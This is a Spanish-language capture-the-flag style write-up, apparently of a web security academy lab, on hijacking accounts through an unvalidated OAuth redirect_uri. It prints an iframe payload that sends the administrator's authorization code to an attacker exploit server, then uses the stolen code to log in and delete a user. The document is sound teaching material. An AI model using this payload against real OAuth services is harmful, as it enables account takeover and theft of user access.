# 4. Secuestro de Cuenta por Redirect\_uri en OAuth

## 🔁 **Secuestro de cuenta por ‘redirect\_uri’ en OAuth**

### 📄 **Descripción del laboratorio**

Este laboratorio utiliza un servicio OAuth para permitir que los usuarios inicien sesión con su cuenta de redes sociales.\
Debido a una **mala configuración del parámetro `redirect_uri` en el proveedor OAuth**, un atacante puede robar **códigos de autorización** asociados a otros usuarios.

🎯 **Objetivo:**\
Robar un código de autorización OAuth perteneciente al **usuario administrador**, usarlo para iniciar sesión como él y eliminar al usuario **carlos**.

Condiciones del laboratorio:

* El administrador:
  * Tiene sesión activa en el proveedor OAuth
  * Abrirá cualquier cosa enviada desde el Exploit Server
* Credenciales de redes sociales del atacante:

```
wiener : peter
```

***

### 📚 Teoría

Este laboratorio explota un fallo crítico en OAuth relacionado con el **parámetro `redirect_uri`** dentro del **Authorization Code Flow**.

En un flujo OAuth correcto:

1. El cliente redirige al usuario al proveedor OAuth con:
   * `client_id`
   * `redirect_uri`
   * `response_type=code`
2. El proveedor OAuth **valida que el `redirect_uri` esté registrado** para ese cliente.
3. Tras la autenticación, el proveedor redirige al usuario a ese `redirect_uri` con:

```
?code=AUTHORIZATION_CODE
```

El fallo de este laboratorio es que el **proveedor OAuth no valida el `redirect_uri`**:

* No existe whitelist
* No se comprueba dominio
* Acepta cualquier URL arbitraria

Esto permite a un atacante **redireccionar códigos de autorización hacia un dominio que controla**, como el Exploit Server.

Si la víctima tiene una sesión activa en el proveedor OAuth, el ataque se completa **sin interacción adicional**.

El impacto es crítico:

* Robo de códigos OAuth
* Account takeover completo en la aplicación cliente

***

### 📝 Práctica

#### 1️⃣ Analizar el flujo OAuth normal

Iniciamos sesión en el blog usando OAuth con nuestras credenciales sociales:

```
wiener : peter
```

Interceptamos el flujo con Burp Suite y observamos la petición de autorización al proveedor OAuth, similar a:

```
GET /auth?
client_id=...
&redirect_uri=https://ID-LAB.web-security-academy.net/oauth-callback
&response_type=code
&scope=openid profile email
```

<figure><img src="../../../.gitbook/assets/image (247).png" alt=""><figcaption></figcaption></figure>

Tras autenticarnos, el proveedor nos redirige al blog con:

```
/oauth-callback?code=XXXXX
```

Flujo estándar confirmado.

***

#### 2️⃣ Probar el control del `redirect_uri`

Modificamos manualmente el parámetro `redirect_uri` en la petición de autorización, por ejemplo a:

```
https://test.com
```

Enviamos la petición.

<figure><img src="../../../.gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>

📌 Resultado:

* El proveedor OAuth **acepta el redirect**
* Redirige a `https://test.com?code=...`

Confirmado: el proveedor **no valida el `redirect_uri`**.

***

#### 3️⃣ Preparar el ataque de robo de código

El objetivo ahora es robar **el código OAuth del administrador**.

Sabemos que:

* El admin tiene sesión activa en el proveedor OAuth
* Abrirá cualquier exploit que le enviemos

La idea es:

* Forzar al navegador del admin a iniciar el flujo OAuth
* Usar un `redirect_uri` apuntando a nuestro Exploit Server
* Capturar el `code` en los logs

***

#### 4️⃣ Construir el exploit OAuth

Creamos un exploit en el **Exploit Server** con un iframe que apunte directamente al endpoint de autorización del proveedor OAuth, pero con `redirect_uri` malicioso:

```html
<iframe src="https://oauth-XXXXX.oauth-server.net/auth?
client_id=CLIENT_ID
&redirect_uri=https://EXPLOIT-SERVER.exploit-server.net/oauth-callback
&response_type=code
&scope=openid%20profile%20email">
</iframe>
```

📌 Importante:

* Usamos `/oauth-callback` en el Exploit Server para que el código aparezca claramente en los logs.

<figure><img src="../../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>

Pulsamos:

* **Store**
* **Deliver exploit to victim**

***

#### 5️⃣ Robo del código OAuth del administrador

El laboratorio simula que el **administrador** visita nuestro exploit:

* Su navegador carga el iframe
* Tiene sesión activa en el proveedor OAuth
* El proveedor genera un **código de autorización para el administrador**
* Redirige a:

```
https://EXPLOIT-SERVER/oauth-callback?code=ADMIN-CODE
```

Vamos a **Access logs** del Exploit Server y vemos claramente:

```
GET /oauth-callback?code=ADMIN-CODE
```

<figure><img src="../../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>

📌 Copiamos ese `ADMIN-CODE`.

***

#### 6️⃣ Usar el código robado

Ahora usamos manualmente el código robado en el callback legítimo del laboratorio:

```
https://ID-LAB.web-security-academy.net/oauth-callback?code=ADMIN-CODE
```

Pegamos la URL en nuestro navegador.

<figure><img src="../../../.gitbook/assets/image (253).png" alt=""><figcaption></figcaption></figure>

El servidor:

* Intercambia el código por un token
* Autentica al usuario asociado a ese código
* Inicia sesión **como administrador**

✔️ Acceso conseguido.

***

#### 7️⃣ Eliminar al usuario carlos

Accedemos al panel de administración:

```
/admin
```

Buscamos al usuario **carlos** y lo eliminamos.

El laboratorio detecta la acción y se resuelve.
